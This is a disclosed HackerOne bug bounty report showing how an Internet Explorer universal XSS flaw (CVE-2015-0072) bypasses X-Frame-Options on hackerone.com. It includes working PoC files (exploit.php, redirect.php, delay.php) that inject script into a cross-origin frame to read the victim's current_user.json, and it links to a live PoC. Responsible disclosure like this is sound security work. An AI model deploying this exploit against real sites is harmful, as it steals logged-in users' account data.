# HackerOne is still prone to Internet Explorer UXSS

## Report Details
- **Report ID**: 108056
- **URL**: https://hackerone.com/reports/108056
- **State**: Closed
- **Severity**: N/A
- **Submitted**: 2016-01-04T11:34:44.163Z
- **Disclosed**: 2017-04-19T18:16:55.902Z

## Reporter
- **Username**: zombiehelp54
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: security

## Vulnerability Information
Hi, I have managed to leverage CVE 2015-0072, so that the attack will work with any framed resource protected by `X-Frame-Options: DENY` header.
According to #103787, only https://hackerone.com/cdn-cgi/trace was unprotected and now its already fixed. In my PoC I used several X-Frame-Options protected resources of HackerOne and the attack was executed successfully.

Proof Of Concept
--------------------------
1. exploit.php

I added alert() message after executing the payload (read content of current_user.json) because responseText  wasn't readable as steadyState stick at 1 and status at 0

```
<iframe src="redirect.php?<? echo rand(); ?>" style=""></iframe>
<iframe src="https://hackerone.com/assets/news/vulnerabilities_fixed/vulnfixed-652ab9bb4eac2826a0fc8a2fae551115.png?<? echo rand(); ?>" style=""></iframe>
<script>
top[0].eval('_=top[1];xhttp=new XMLHttpRequest();xhttp.open("get","delay.php?<? echo rand(); ?>",false);xhttp.send(); _.location="javascript:http=new XMLHttpRequest(); url=\'https://hackerone.com/current_user.json\';http.open(\'GET\', url, true);http.onreadystatechange = function(){if(http.readyState == 4 && http.status == 200)console.log(http.responseText);}; http.send(); alert(\'No need to close this, already done!\'); "');
</script>
```

2- redirect.php

```
<?php 
header("Location: https://hackerone.com/assets/news/vulnerabilities_fixed/vulnfixed-652ab9bb4eac2826a0fc8a2fae551115.png?".rand()); 
exit(); 
?>
```

3- delay.php

```
<?php 
sleep(5);
echo "zombiehelp54";
exit(); 
?>
```

Live PoC
---------------
I have tested this live PoC on my IE 11.0.9600.17.633 updated February 2015 and also on IE 11 of Windows Server 2012 R2 and it worked as expected (see screenshots).
I also tried many resources of HackerOne and all is X-Frame-Options protected.
Just open any  vulnerable IE (9,10,11 without MS15-018 applied) and turn on console
Go to http://alazzazpp.com/myuxss/exploit.php and your current_user.json will be logged to console.

I couldn't find a mitigation to this, I hope you do.
Thanks;



## Attachments
- redirect.php
- exploit.php
- delay.php
- hackerone_uxss_2.png
- hackerone_uxss_1.png
